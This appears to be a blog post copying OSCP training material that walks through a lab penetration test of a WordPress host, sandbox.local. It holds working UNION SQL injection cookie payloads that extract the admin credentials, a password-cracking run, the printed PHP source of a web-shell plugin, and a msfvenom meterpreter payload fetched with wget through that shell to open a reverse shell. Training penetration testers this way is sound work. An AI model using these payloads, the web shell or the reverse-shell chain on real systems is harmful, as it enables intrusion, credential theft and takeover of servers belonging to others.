---
layout: post
title:  "OSCP Origin Part 24_1"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Assembling the Pieces of Penetration Testing"
toc: true
comments: false
rating: 3.5
---

24. Assembling the Pieces: Penetration Test Breakdown

24. Assembling the Pieces: Penetration Test Breakdown

• Now that we have introduced all the individual pieces of a penetration test, it’s time to put them together.
 
• In this module, we will conduct a simulated penetration test inspired by real-world findings.
 
• Although our goal in this exercise is to obtain domain administrator access in the environment, itis important to note that this is not always the end goal of a penetration test. 
 
• Our goal should bedetermined by the client’s data infrastructure and business model.

• For example, if the client’s mainbusiness is warehousing data, our goal would be to obtain those data.
 
• That is because a breach ofthis nature would cause the most significant impact to the client.

• In most cases, domainadministrator access would help us accomplish that goal, but that is not always the case.
 
• During this penetration test, we will be going back and forth between enumeration and exploitation.
 
• We will spend some time on the enumeration phase to ensure that the methodology we are using for exploitation is good.
 
• We will also review some mistakes that are easily made and discuss why obtaining root/admin on a target is not always necessary.
 
• Our fictitious client has provided us an initial target named “sandbox.local” and has mentioned thata compromised domain administrator account would have the greatest impact on their business.
 
• The sandbox network is accessible via the lab VPN and has the network layout found.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/1.jpg)

• This domain is accessible via the PWK VPN but requires us to add an entry to our
 /etc/hosts file.
 
• First, we’ll make a backup of the existing file by copying /etc/hosts to hosts.orig in our home directory.
 
• Now we’ll append an entry that will allow us to contact the domain via its DNS name by running sudo bash -c" echo ‘10.11.1.250 sandbox.local’ >> /etc/hosts"
 
• With that set, wecan continue.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/2.jpg)

24.1 Public Network Enumeration

24.1 Public Network Enumeration

 We will begin by conducting a scan of the external host resolvable through the DNS name sandbox.local.
 
 To do this, we will use Nmap with the following command:
 
 kali@kali:~$ sudo nmap -sC -sS -p0-65535 sandbox.local

 
 The command in Listing  will use Nmap’s 
•  default set of scripts (-sC) 
•  use a SYN scan for faster run time (-sS), 
•  scan all ports (-p0-65535) 
 
 and only target the sandbox.local network.
 
 The Nmap scan results can be found in Listing 856.
 
 Nmap scan report for sandbox.local (10.11.1.250)
Host is up (0.00060s latency).
Not shown: 65534 filtered ports
PORT STATE SERVICE
22/tcp open ssh

| ssh-hostkey:
| 2048 86:8f:89:36:79:2f:44:b2:61:18:a4:fb:d5:a1:f3:43 (RSA)
| 256 de:f3:84:f1:cd:f3:c8:9a:30:6d:60:e8:b1:1d:99:27 (ECDSA)
|_ 256 14:6a:ba:77:e0:57:e5:0c:c0:cc:76:31:91:8d:dd:9f (ED25519)
80/tcp open http

|_http-generator: WordPress 5.3
|_http-title: SandBox &#8211; See the future, Feel the shine
MAC Address: 00:50:56:8A:C8:51 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 111.66 seconds

 
 Let’s review the results of this scan. First, the Nmap scan revealed only two open ports: 22 and 80.
 
 Nmap fingerprinted the services as running a SSH service and HTTP service on the ports respectively. 
 
 The Nmap default set of plugins also revealed the ssh-hostkeys.
 
 The HTTP service is showing us that the running application might be WordPress 5.3. 
 
 The risk exposed by the SSH service is typically a lot less than the one exposed by an HTTP service.
 
 Therefore, the HTTP service seems to be a better starting point to compromise the sandbox.local environment.
24.2 Targeting the Web Application

24.2 Targeting the Web Application

The first step we take is simply visiting the web application home page.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/3.jpg)

 The home page seems to be a fairly standard landing page for a company.
 
 The links in the navigation bar all point to anchors on the home page and there is a survey asking for feedback o nthe bottom left.
 
 There appears to be no other field for user-controlled input.

 The Nmap scan indicated that the web page is running on WordPress 5.3, but to confirm that, further enumeration is required.

 While the WordPress core itself has had its share of vulnerabilities, the WordPress developers are quick to patch them.
 
 However, themes and plugins are written by the community and many vulnerabilities are improperly patched or are simply never fixed at all.

 This makes WordPress a great target for compromise.
24.2.1 Web Application Enumeration

24.2.1 Web Application Enumeration

• Before we begin targeting WordPress specifically, let’s do a basic directory brute force to discover any potential sensitive files and to confirm that the site is running WordPress. 
 
• For this, we will use dirb as follows.
 
 kali@kali:~$ dirb http://sandbox.local
 
• While dirb has many flags and features that we could use, we are choosing to run a simple test.
 
• The output of our command can be found in Listing.

...
---- Scanning URL: http://sandbox.local/ ----
+ http://sandbox.local/index.php (CODE:301|SIZE:0)
+ http://sandbox.local/server-status (CODE:403|SIZE:278)
==> DIRECTORY: http://sandbox.local/wp-admin/
==> DIRECTORY: http://sandbox.local/wp-content/
==> DIRECTORY: http://sandbox.local/wp-includes/
+ http://sandbox.local/xmlrpc.php (CODE:405|SIZE:42)
---- Entering directory: http://sandbox.local/wp-admin/ ----
+ http://sandbox.local/wp-admin/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://sandbox.local/wp-admin/css/
==> DIRECTORY: http://sandbox.local/wp-admin/images/
==> DIRECTORY: http://sandbox.local/wp-admin/includes/
+ http://sandbox.local/wp-admin/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://sandbox.local/wp-admin/js/
==> DIRECTORY: http://sandbox.local/wp-admin/maint/
==> DIRECTORY: http://sandbox.local/wp-admin/network/
==> DIRECTORY: http://sandbox.local/wp-admin/user/
---- Entering directory: http://sandbox.local/wp-content/ ----
+ http://sandbox.local/wp-content/index.php (CODE:200|SIZE:0)
==> DIRECTORY: http://sandbox.local/wp-content/plugins/
==> DIRECTORY: http://sandbox.local/wp-content/themes/
==> DIRECTORY: http://sandbox.local/wp-content/upgrade/
==> DIRECTORY: http://sandbox.local/wp-content/uploads/
---- Entering directory: http://sandbox.local/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://sandbox.local/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
 (Use mode '-w' if you want to scan it anyway)
...
-----------------
END_TIME: Mon Dec 9 13:00:40 2019
DOWNLOADED: 32284 - FOUND: 12


• Our scan revealed common WordPress directories on our target (wp-admin, wp-content, and wpincludes). 

• We also found some directories that are listable; however, these are common Word Press directories and likely won’t reveal much.


• Let’s move on to a more specific scan with WPScan, a WordPress vulnerability scanner that uses a database of known vulnerabilities to discover security issues with WordPress instances.

• For a thorough scan, we will need to provide the URL of the target 
 (–url) and configure the enumerate option (–enumerate) to include “All Plugins” (ap), “All Themes” (at), “Config backups”(cb), and “Db exports” (dbe). 
 
• The final command can be found in Listing below.

kali@kali:~$ wpscan --url sandbox.local --enumerate ap,at,cb,dbe



...
[i] Plugin(s) Identified:
[+] elementor
| Location: http://sandbox.local/wp-content/plugins/elementor/
| Last Updated: 2019-12-08T17:19:00.000Z
| [!] The version is out of date, the latest version is 2.7.6
|
| Found By: Urls In Homepage (Passive Detection)
|
| Version: 2.7.4 (100% confidence)
| Found By: Query Parameter (Passive Detection)
| - http://sandbox.local/wp-content/plugins/elementor/assets/css/frontend.min.css?ve
r=2.7.4
| - http://sandbox.local/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=
2.7.4
| Confirmed By: Readme - Stable Tag (Aggressive Detection)
| - http://sandbox.local/wp-content/plugins/elementor/readme.txt
[+] ocean-extra
| Location: http://sandbox.local/wp-content/plugins/ocean-extra/
| Last Updated: 2019-11-13T16:17:00.000Z
| [!] The version is out of date, the latest version is 1.5.19
|
| Found By: Urls In Homepage (Passive Detection)
|
| Version: 1.5.16 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt
[+] wp-survey-and-poll
| Location: http://sandbox.local/wp-content/plugins/wp-survey-and-poll/
| Last Updated: 2019-10-15T10:32:00.000Z
| [!] The version is out of date, the latest version is 1.5.8.2
|
| Found By: Urls In Homepage (Passive Detection)
|
| Version: 1.5.7.3 (50% confidence)
| Found By: Readme - ChangeLog Section (Aggressive Detection)
| - http://sandbox.local/wp-content/plugins/wp-survey-and-poll/readme.txt
[+] Enumerating All Themes (via Passive and Aggressive Methods)
...

 The most interesting items that we discovered are the three plugins that are installed: 
•  elementor
•  ocean-extra
•  and wp-survey-and-poll
 
 WPScan has its own vulnerability database that the tool canuse, but it requires registration.
 
 To avoid registration, since we only found three plugins, we can use search sploit to find possible vulnerabilities in the installed plugins.
 
 After updating searchsploit with the –update option, we can search for each plugin

kali@kali:~$ searchsploit elementor
Exploits: No Result
kali@kali:~$ searchsploit ocean-extra
Exploits: No Result
kali@kali:~$ searchsploit wp-survey-and-poll
Exploits: No Result

 Unfortunately, we did not find any exploits.
 
 We need to be careful with how we are searching,however.
 
 Just because a search for “ocean-extra” did not find anything, does not mean that nothing exists. 
 
 We’ll try and use a more generic search for ocean-extra, such as “ocean”.

kali@kali:~$ searchsploit ocean

------------------------------------------------------ -------------------------------
Exploit Title | Path (/usr/share/exploitdb/)
------------------------------------------------------ -------------------------------
Apache Libcloud Digital Ocean API - Local Information | exploits/linux/local/38937.txt
Ocean FTP Server 1.00 - Denial of Service | exploits/windows/dos/893.pl
Ocean12 (Multiple Products) - 'Admin_ID' SQL Injectio | exploits/asp/webapps/32602.txt
Ocean12 ASP Calendar Manager 1.0 - Authentication Byp | exploits/asp/webapps/26473.txt
Ocean12 ASP Guestbook Manager 1.0 - Information Discl | exploits/asp/webapps/22484.txt
Ocean12 Calendar Manager 1.0 - Admin Form SQL Injecti | exploits/php/webapps/25469.txt
Ocean12 Calendar Manager Gold - Database Disclosure | exploits/php/webapps/7247.txt
Ocean12 Contact Manager Pro - SQL Injection / Cross-S | exploits/php/webapps/7244.txt
Ocean12 FAQ Manager Pro - 'ID' Blind SQL Injection | exploits/php/webapps/7271.txt
Ocean12 FAQ Manager Pro - 'Keyword' Cross-Site Script | exploits/asp/webapps/32601.txt
...


 Searching for just “ocean” gave us a few results, but reviewing the output shows that none are for a WordPress plugin.
 
 Let’s do the same for wp-survey-and-poll and search for “survey poll”.

kali@kali:~$ searchsploit survey poll
------------------------------------------------------ -------------------------------
Exploit Title | Path (/usr/share/exploitdb/)
------------------------------------------------------ -------------------------------
MD-Pro 1.083.x - Survey Module 'pollID' Blind SQL Inj | exploits/php/webapps/9021.txt
PHP-Nuke CMS (Survey and Poll) - SQL Injection | exploits/php/webapps/11627.txt
Pre Survey Poll - 'catid' SQL Injection | exploits/asp/webapps/6119.txt
WordPress Plugin Survey and Poll 1.1 - Blind SQL Inje | exploits/php/webapps/36054.txt
Wordpress Plugin Survey & Poll 1.5.7.3 - 'sss_params' | exploits/php/webapps/45411.txt
nabopoll 1.2 - 'survey.inc.php?path' Remote File Incl | exploits/php/webapps/3315.txt
---------------------------------------------------------------- ---------------------


 This search looks much more promising.
 
 The fourth and fifth result seem to be for our WordPress plugin.
  
 The fifth result, titled “Wordpress Plugin Survey & Poll 1.5.7.3”, also matches the version ofour plugin (1.5.7.3) that was found by WPScan.
 
 Let’s inspect the exploit to see if we find anything interesting.

...
# Description
# The vulnerability allows an attacker to inject sql commands using a value of a
# cookie parameter.
# PoC
# Step 1. When you visit a page which has a poll or survey, a question will be
# appeared for answering.
# Answer that question.

# Step 2. When you answer the question, wp_sap will be assigned to a value. Open
# a cookie manager, and change it with the payload showed below;
["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]
# It is important that the "OR" statement must be 1=2. Because, application is
# reflecting the first result of the query. When you make it 1=1, you should see a
# question from firt record. Therefore OR statement must be returned False.
# Step 3. Reload the page. Open the source code of the page. Search "sss_params".
# You will see the version of DB in value of sss_params parameter.
...

 Skimming through the exploit does not mention if further authentication is required. 
 
 However, a cookie needs to be set.
 
 Let’s go to the plugin website and see if we can find any more information about it.
 
 A quick Google search for “Wordpress Survey & Poll” leads us to the plugin page.
 
 Lookingthrough the screenshots, we find an example of what a survey would look like on a page.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/4.jpg)

We found a similar survey on the home page of sandbox.local.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/5.jpg)

 Let’s open up Burp Suite, configure the proxy settings in Firefox, and intercept the communications when we interact with the survey.

 With the page loaded and Burp configured to intercept, we will click one of the options of the survey.
 
 This will result in a request captured in Burp. 
 
 We will click Forward in Burp to continue the pageload.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/6.jpg)

 Now when we reload the page, we notice the cookie that the exploit code mentioned was vulnerable.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/7.jpg)

 With this cookie, we can start attempting to exploit the SQL injection vulnerability.
24.2.2 SQL Injection Exploitation


755 24.2.2 SQL Injection Exploitation

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/8.jpg)


•  we have captured a request with the vulnerable cookie, we can use it in Burp’s “Repeater”to attempt exploitation of the SQL injection. 
 
•  To do so, we find the request in Burp’s “HTTP History” tab that contained the cookie, right click it, and select “Send to Repeater”.

 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/9.jpg)
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/10.jpg)
 
 Then we click on the “Repeater” tab and view the cookie in its raw form.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/11.jpg)
 
•  Let’s take the payload from the original exploit, place it into the cookie, and send the request to the server. 
 
•  The payload can be found in Listing 865.
 
 ["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]

 
•  According to the exploit, the payload can be inserted into the wp_sap cookie variable value. 

• The value of the cookie variable starts after the “=” sign and must end with a semicolon.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/12.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/13.jpg)
 
• The exploit code mentions that the result of the SQL injection will be placed in the sss_params variable within a “script” tag.

• Searching for the variable in Burp should take us to the location of the output from the SQL injection.
 
•  We can also set Burp to “auto-scroll” to this location in the future to make exploitation easier so we don’t have to scroll to find the output each time.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/14.jpg)
 
 In this output, we can see the version of the database in use. This shows us that the SQL injection worked!
 
```js
 <script type='text/javascript'>
/* <![CDATA[ */
var sss_params = {"survey_options":"{\"options\":\"[\\\"bottom\\\",\\\"easeInOutBack\\
\",\\\"\\\",\\\"-webkit-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 2
04) 70%);-moz-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);-
ms-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);-o-linear-gr
adient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);linear-gradient(top , rg
b(255, 255, 255) 35% , rgb(204, 204, 204) 70%);\\\",\\\"rgb(0, 0, 0)\\\",\\\"rgb(93, 9
3, 93)\\\",\\\"1\\\",\\\"0\\\",\\\"12\\\",\\\"9\\\",\\\"8\\\",500,\\\"Thank you for yo
ur feedback!\\\",\\\"0\\\",\\\"0\\\",\\\"0\\\"]\",\"plugin_url\":\"http:\\\/\\\/sandbo
x.local\\\/wp-content\\\/plugins\\\/wp-survey-and-poll\",\"admin_url\":\"http:\\\/\\\/
sandbox.local\\\/wp-admin\\\/admin-ajax.php\",\"survey_id\":\"1550849657\",\"style\":\
"modal\",\"expired\":\"false\",\"debug\":\"true\",\"questions\":[[\"Are you enjoying t
he new site?\",\"Yes\",\"No\"],[\"10.3.20-MariaDB\"]]}"};
/* ]]> */
</script>
```
 
•  Now we know that the database used by this WordPress instance is 10.3.20-MariaDB.
 
•  MariaDB is a fork of MySQL.

•  It was designed to work as a plug-and-play alternative to MySQL and SQL injection exploits used for MySQL typically work for MariaDB as well.
 
•  Now that we know the SQL injection works, we need to determine our next step. 

• While uploading aPHP shell through MariaDB might enable us to get remote code execution on the Word Press instance, it could be very temperamental and difficult if we don’t have more information about thes ystem.
 
• Let’s start with something easier and extract the admin’s username and password hash.

• To do this,we will need to get a list of tables, find the user’s table, get a list of columns, and then finally extract the relevant information.
 
• To get a list of table names, we need to query the information_schema.tables table for the table_name column. 

• This can be done by altering the cookie payload as shown in Listing 867.
 
 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM
 
 information_schema.tables#"]
 
 
•  Note that we have also removed the “ALL” from the original payload.

•  This is to decrease the results as we don’t care about duplicate values.
 
•  Again, the payload can by inserted into the wp_sap cookie value.

•  As before, the value of the cookie starts after the “=” sign and ends with a semicolon.
 
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/15.jpg)
 
• The result includes a large list of tables, but the one that stands out to us most is wp_users, since it will most likely contain the WordPress user information.
 
•  Now that we have the table name, we can work on retrieving its column names. 

• To do this, we query the column_name column within information_schema.

• columns, limiting the result to those where the table is wp_users.

•  This can be done by updating our payload as shown in Listing 868.
 
 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM 

information_schema.columns WHERE table_name='wp_users'#"]
 
•  As with the previous payload, this payload will also be placed in the wp_sap cookie value in the Repeater tab.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/16.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/17.jpg)
 
• The result of our query reveals several column names.

• The most interesting to us are user_login and user_pass as these will most likely contain the credentials to authenticate to the WordPress instance.
 
• Next, let’s query for the username. 

• To do this, we need to send a SQL injection request asking for all user_login values from the wp_users table.

• This can be done by updating our query as follows.
 
 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"]

 
 We once again repeat the same injection as before.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/18.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/19.jpg)
 
•  This query discloses only one username: wp_ajla_admin. 

• Now that we have a username, it’s time to get the password hash.
 
•  To do this, we need to replace user_login in our query with user_pass.
 
 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"]

 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/20.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/21.jpg)
 
• As a result of our injection, we are able to recover the admin’s password hash. 

• Note the encoding at the end; the response contains three “\” characters to escape the single “/”. 

• This hash will need to be cracked before we attempt to authenticate against the web application.
24.2.2.2 Exercise

24.2.2.2 Exercise


1. Use sqlmap to exploit the SQL injection and extract the username and password.
24.2.3 Cracking the Password
 	
 
 24.2.3 Cracking the Password
 
• Now that we have the password hash, we will need to crack it to get the plain text password. 

• While we can run a traditional brute force attack where we try every letter combination in the hopes that one matches up, this might take a very long time.

• Instead we will choose to start by using the“rockyou” wordlist, which is included in Kali Linux.
 
 If you haven’t already done so, you can expand the archive by decompressing the/usr/share/wordlists/rockyou.txt.gz file with gunzip. This will replace the archivefile with a plain text file.
 
• Before we continue, let’s create a file containing the password hash.
 
 kali@kali:~$ echo "$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/" > pass.txt

 
• Let’s attempt to crack the password using John the Ripper.

• We will use the –wordlist option along with the path to our wordlist and provide the filename that contains the password hash.
 
 kali@kali:~/Desktop/sandbox.local$ john --wordlist=/usr/share/wordlists/rockyou.txt pa
ss.txt
...
!love29jan2006! (?)
1g 0:00:22:59 DONE 0.000724g/s 10391p/s 10391c/s 10391C/s !lovegod..!lov3h!m
Use "--show --format=phpass" to display all of the cracked passwords reliably
Session completed
 
• Running the command above may take a long time, depending on the CPU of the computer.

•  Based on the output in Listing 872, John indicates that the password is “!love29jan2006!”. 

• Let’s try to see if we can log in to the web application.
 
• By default, the WordPress login page can be found at /wp-admin.

•  Visiting this page prompts us to enter a username and password.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/22.jpg)
 
• Once we click Login, we get to the admin dashboard.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/23.jpg)
 
•  It is possible that you might get a request to verify the admin email.

•  If this is the case, you can just click “This email is correct” to continue.
 
•  Now that we are logged in, we can continue our enumeration journey to discover what we should exploit next.
24.2.4 Enumerating the Admin Interface


24.2.4 Enumerating the Admin Interface

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/24.jpg)
 
• Logging in to the admin interface opens up the door for further  exploitation.
 
• Before we start exploring ways to elevate our current access, 
  let’s investigate the options WordPress has to offer.
 
• One good place to start in WordPress is the Info tab under the 
  Tools > Site Health section.
  
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/25.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/26.jpg)
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/27.jpg)
 
• On this page, we can determine that the server is running WordPress using PHP version 7.0.33-0 ubuntu0.16.04.7.
 
• We also find that the database is running on the 10.5.5.11 IP address, which is different than the one we are currently targeting.
 
• This is not unusual as databases and web applications are often run on separate servers.
 
•  Now that we have gathered some basic information, we can attempt to elevate our access. 

• One convenient aspect of having administrative access to WordPress is that we can install our own plugins. 

• Plugins in WordPress are written in PHP and do not have many limitations.

• For example,we could upload a plugin that contains a PHP reverse shell or code execution capabilities.

• Fortunately, others have already created malicious plugins just for this purpose.
 
• One such plugin can be found in the seclists package, which can be installed in Kali with apt.
 
 kali@kali:~$ sudo apt install seclists
 
• Once installed, the seclist directory can be found in 
 /usr/share/seclists and the file that we are looking for can be found in Web-Shells/WordPress.
 
 kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress

kali@kali:/usr/share/seclists/Web-Shells/WordPress$ ls
bypass-login.php plugin-shell.php
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/28.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/29.jpg)
 
• The specific file we are looking for is plugin-shell.php.

• Let’s quickly inspect it and find out what it does.

```sh
1 <?php
2 /*
3 Plugin Name: Cheap & Nasty Wordpress Shell
4 Plugin URI: https://github.com/leonjza/wordpress-shell
5 Description: Execute Commands as the webserver you are serving wordpress with!
Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given
using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.
php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(
www-data) groups=33(www-data)</code>
6 Author: Leon Jacobs
7 Version: 0.3
8 Author URI: https://leonjza.github.io
9 */
```
 
•  Lines 2-9 in Listing 875 are comments that are required for WordPress to recognize the file as aplugin.
 
 11 # attempt to protect myself from deletion
12 $this_file = __FILE__;
13 @system("chmod ugo-w $this_file");
14 @system("chattr +i $this_file");
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/30.jpg)
 
•  Lines 12-14 attempt protect the file from being deleted by the system.
 
 19 # test if parameter 'cmd', 'ip or 'port' is present. If not this will avoid an err
or on logs or on all pages if badly configured.
20 if(isset($_REQUEST[$cmd])) {
21
22 # grab the command we want to run from the 'cmd' GET or POST parameter (POST d
on't display the command on apache logs)
23 $command = $_REQUEST[$cmd];
24 executeCommand($command);
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/31.jpg)
 
 
• Lines 20-24 will attempt to run a system command if the cmd variable is set in the HTTP request.

• The plugin will use the execute Command function in order to identify and execute the appropriate PHP internal API to run a command on the target system.

•  The execute Command function can befound on Lines 47-82.
 
 47 function executeCommand(string $command) {
48
49 # Try to find a way to run our command using various PHP internals
50 if (class_exists('ReflectionFunction')) {
51
52 # http://php.net/manual/en/class.reflectionfunction.php
53 $function = new ReflectionFunction('system');
54 $function->invoke($command);
55
56 } elseif (function_exists('call_user_func_array')) {
57
58 # http://php.net/manual/en/function.call-user-func-array.php
59 call_user_func_array('system', array($command));
60
61 } elseif (function_exists('call_user_func')) {
62
63 # http://php.net/manual/en/function.call-user-func.php
64 call_user_func('system', $command);
65
66 } else if(function_exists('passthru')) {
67
68 # https://www.php.net/manual/en/function.passthru.php
69 ob_start();
70 passthru($command , $return_var);
71 $output = ob_get_contents();
72 ob_end_clean();
73
74 } else if(function_exists('system')){
75
76 # this is the last resort. chances are PHP Suhosin
77 # has system() on a blacklist anyways :>
78
79 # http://php.net/manual/en/function.system.php
80 system($command);
81 }
82 }
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/32.jpg)
 
• The plugin-shell.php plugin is a catalyst to execute commands on the system.
 
• Once we are able to trigger arbitrary code execution on the compromised host, there are a number of methods we could use to obtain a proper reverse shell.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/33.jpg)

24.2.5 Obtaining a Shell

24.2.5 Obtaining a Shell  -768

• To obtain a shell, we first must package the plugin in a way that WordPress knows how to handle. WordPress expects plugins to be in a zip file. When WordPress receives the zip file, it will extract itinto the wp-content/plugins directory on the server.

• WordPress places the contents of the zip file into a folder that matches the name of the zip file itself. Because of this, we will need to make note of the name of the file in order to be able to access our PHP shell later on.


• The creation of a zip file is shown in Listing 879.

kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ sudo zip plugin-shell.zip plugin-s
hell.php
 adding: plugin-shell.php (deflated 58%)

The generated zip file is named plugin-shell.zip and will be placed in the plugin-shell folder within wp-content/plugins on the server.

Now that the plugin package is generated, it’s time to upload the shell. First, we need to visit thePlugins page by clicking the Plugins link on the left sidebar.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/34.jpg)

Next, we install the plugin by clicking Add New at the top left. This will take us to the “Add Plugins”page.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/35.jpg)

Since we are not downloading a plugin from the WordPress plugin directory, we need to select Upload Plugin at the top left of the page.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/36.jpg)

This will open up a section where we can select our plugin package. We need to select Browse,which will open up a file dialog for us to find the created package.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/37.jpg)

With the file dialog open, we navigate to the directory containing our plugin, select the pluginshell.zip file, and click Open at the bottom of the file dialog.

Finally, to install the plugin, we click Install Now.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/38.jpg)

Installing the plugin will upload the zip and extract the contents.

 Now that the plugin is installed, we can attempt to use it to run system commands on theWordPress target. For this, we can simply use cURL. As discussed earlier, the directory for theplugin is wp-content/plugins/, the zip will be extracted into a directory named plugin-shell, and thefile that we are targeting is named plugin-shell.php.
 
 Remember that we must also set a cmd parameter containing the command we are attempting to execute on the target system. Let’s attempt to run whoami and see if the shell worked.
 
 It worked! Based on the output of Listing 880, we are running commands as the www-data user.Now it’s time to upload a meterpreter payload and obtain a full reverse shell.
 
 First let’s generate a meterpreter payload with the msfvenom utility.
 
 kali@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -
f elf > shell.elf
 
 
 We are selecting the Linux reverse TCP meterpreter payload since we know that the target isrunning on Ubuntu from our previous enumeration efforts. The LHOST option will point to our KaliIP address and we are selecting an LPORT of 443 in an attempt to evade any outbound firewall rules.While it’s good practice to always check for any egress filtering, in this case we will make theassumption that port 443 is unrestricted. We are generating the payload as an elf file andredirecting the output to a file named shell.elf in the kali user home directory.
 
 With the meterpreter reverse shell generated, we start a web server to allow the target to downloadthe shell.
 
 kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ...
 
 The webserver in Listing 882 is using the Python http.server module, is instructed to use port 80,and is serving files from the kali user home directory. We chose port 80 again to avoid any potentialissues we might run into if there is a firewall blocking arbitrary outbound ports.
 
 With the shell generated and the web server running, we will instruct the target to download theshell. We will use wget from the target to download the shell from our Kali system. However, wemust encode any space characters with “%20” since we cannot use spaces in URLs. The commandwe are running is shown in Listing 883.
 
 kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph
p?cmd=wget%20http://10.11.0.4/shell.elf
 
 If the command worked, we should see an entry similar to the following in our Python webserver’slog.
 
 Serving HTTP on 0.0.0.0 port 80 ...
10.11.1.250 - - [09/Dec/2019 19:40:16] "GET /shell.elf HTTP/1.1" 200 -

 
 Success! Next we need to make the shell executable, start a Metasploit payload handler on Kali,and run the elf file on the target to acquire a meterpreter shell. To make the shell executable, wewill run chmod +x on it. Once again, we need to remember to urlencode sensitive characters suchas space (%20) and “+” (%2b). The command to make the shell executable is displayed in Listing885.
 
 kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph
p?cmd=chmod%20%2bx%20shell.elf
 
 
 At this point, the shell should be executable. Next, we will start a meterpreter payload listener onthe appropriate interface and port.
 
 kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
> set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
> set LHOST 10.11.0.4;\
> set LPORT 443;\
> run"
PAYLOAD => linux/x86/meterpreter/reverse_tcp
LHOST => 10.11.0.4
LPORT => 443
[*] Started reverse TCP handler on 10.11.0.4:443
 
 In the msfconsole command above, we are having Metasploit start quietly (-q) and immediatelyconfigure the payload handler via the -x option, passing the same payload settings we used whengenerating the shell.
 
 With our listener running, it’s finally time to obtain a reverse shell. This can be done by executingthe shell.elf file via the malicious WordPress plugin we installed previously.
 
 kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph
p?cmd=./shell.elf
 
 Returning to our listener, we should see that we have captured a shell.
 
 [*] Sending stage (985320 bytes) to 10.11.1.250
[*] Meterpreter session 1 opened (10.11.0.4:443 -> 10.11.1.250:53768) at 19:54:41
meterpreter > shell
Process 9629 created.
Channel 1 created.
whoami
